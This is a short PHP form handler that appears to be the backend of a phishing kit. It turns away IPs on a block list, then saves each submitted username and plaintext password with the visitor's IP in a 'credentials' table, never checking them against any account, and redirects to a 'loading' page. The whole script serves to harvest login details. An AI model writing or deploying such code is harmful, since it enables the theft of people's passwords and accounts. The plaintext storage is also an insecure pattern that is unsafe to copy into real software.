
<?php
require_once 'config.php';

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Validate CSRF token
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die("CSRF token validation failed");
    }
    
    // Get IP address
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Check if IP is blocked
    $stmt = $pdo->prepare("SELECT * FROM blocked_ips WHERE ip = ?");
    $stmt->execute([$ip]);
    
    if ($stmt->rowCount() > 0) {
        // Log blocked IP attempt
        error_log("Blocked IP attempted login: $ip");
        header("Location: error.php?msg=blocked");
        exit;
    }
    
    // Get form data
    $username = sanitize_input($_POST['username']);
    $password = sanitize_input($_POST['password']);
    
    // Store credentials in the database
    $stmt = $pdo->prepare("INSERT INTO credentials (username, password, ip) VALUES (?, ?, ?)");
    
    if ($stmt->execute([$username, $password, $ip])) {
        $credential_id = $pdo->lastInsertId();
        $_SESSION['credential_id'] = $credential_id;
        $_SESSION['username'] = $username;
        
        // Redirect to loading page
        header("Location: loading.php");
        exit;
    } else {
        // Error handling
        header("Location: error.php?msg=db_error");
        exit;
    }
} else {
    // If not a POST request, redirect to the login page
    header("Location: index.php");
    exit;
}
?>
